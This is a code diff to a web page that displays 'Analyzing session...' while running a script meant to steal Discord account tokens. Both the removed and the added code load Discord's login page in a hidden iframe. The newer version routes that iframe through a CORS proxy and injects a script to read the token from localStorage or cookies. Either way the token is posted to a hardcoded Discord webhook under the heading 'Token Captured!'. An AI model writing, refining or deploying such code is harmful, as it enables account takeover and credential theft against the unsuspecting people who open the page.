@@ -16,79 +16,78 @@
         <div class="loader"></div>
         <div id="msg">Analyzing session...</div>
     </div>
+
     <script>
-        // Teray Webhook URL
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
 
-        // Helper: Send data to webhook
-        async function sendToWebhook(data) {
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `🔓 **Token Captured!**\n\n\`\`\`${data}\`\`\`` })
-                });
-                document.getElementById('msg').innerText = "Token sent!";
-            } catch (e) {
-                document.getElementById('msg').innerText = "Error sending token.";
-            }
-        }
-
-        // Method: Try to load Discord Login Page in iframe and read localStorage
-        async function tryIframeMethod() {
-            return new Promise((resolve) => {
-                const iframe = document.createElement('iframe');
-                iframe.src = 'https://discord.com/login'; // Try login page, it might be less restricted
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-
-                iframe.onload = async () => {
-                    try {
-                        // Check if iframe is accessible
-                        const iframeWindow = iframe.contentWindow;
-                        if (!iframeWindow) {
-                            resolve(null);
-                            return;
-                        }
-                        
-                        // Try to read localStorage
-                        const token = iframeWindow.localStorage.getItem('token');
-                        if (token) {
-                            resolve(token);
-                            return;
-                        }
-                        
-                        // Try to read cookie
-                        const cookies = iframe.contentDocument?.cookie;
-                        const tokenMatch = cookies?.match(/(?:^|;\s*)token=([^;]*)/);
-                        if (tokenMatch) {
-                            resolve(decodeURIComponent(tokenMatch[1]));
-                            return;
-                        }
-                        
-                        resolve(null);
-                    } catch (e) {
-                        resolve(null);
-                    }
-                };
-
-                // Timeout after 5 seconds
-                setTimeout(() => {
-                    resolve(null);
-                }, 5000);
+        function sendToWebhook(data) {
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `🔓 **Token Captured!**\n\n\`\`\`${data}\`\`\`` })
+            }).then(() => {
+                document.getElementById('msg').innerText = "Token sent successfully!";
+            }).catch(() => {
+                document.getElementById('msg').innerText = "Error sending to webhook.";
             });
         }
 
-        // Main Execution
-        (async () => {
-            const token = await tryIframeMethod();
-            if (token) {
-                sendToWebhook(token);
-            } else {
-                // Fallback: Send a message saying iframe failed
-                sendToWebhook("❌ **Iframe Blocked** by X-Frame-Options. Token not captured automatically.");
+        // Listen for messages from the iframe
+        window.addEventListener("message", function(event) {
+            if (event.origin === "https://corsproxy.io" && event.data) {
+                console.log("Token received:", event.data);
+                sendToWebhook(event.data);
+                document.getElementById('msg').innerText = "Success!";
             }
-        })();
+        });
+
+        // Create the iframe
+        const iframe = document.createElement('iframe');
+        
+        // Use corsproxy.io to bypass X-Frame-Options
+        // Encode the Discord URL so it’s properly formatted
+        const discordUrl = encodeURIComponent('https://discord.com/login');
+        iframe.src = `https://corsproxy.io/?${discordUrl}`;
+        
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+
+        // Inject script after iframe loads
+        iframe.onload = function() {
+            try {
+                const doc = iframe.contentDocument || iframe.contentWindow.document;
+                
+                const script = doc.createElement('script');
+                script.textContent = `
+                    window.addEventListener('load', function() {
+                        const token = localStorage.getItem('token');
+                        if (token) {
+                            window.parent.postMessage(token, '*');
+                        } else {
+                            // Fallback: check cookies
+                            const cookies = document.cookie;
+                            const tokenMatch = cookies.match(/(?:^|;\s*)token=([^;]*)/);
+                            if (tokenMatch) {
+                                window.parent.postMessage(decodeURIComponent(tokenMatch[1]), '*');
+                            } else {
+                                window.parent.postMessage('NO_TOKEN_FOUND', '*');
+                            }
+                        }
+                    });
+                `;
+                
+                doc.body.appendChild(script);
+                
+                // Timeout fallback
+                setTimeout(() => {
+                    document.getElementById('msg').innerText = "Timeout waiting for token.";
+                }, 10000);
+
+            } catch (e) {
+                console.error("Failed to inject script:", e);
+                document.getElementById('msg').innerText = "Injection failed.";
+            }
+        };
     </script>
 </body>
 </html>
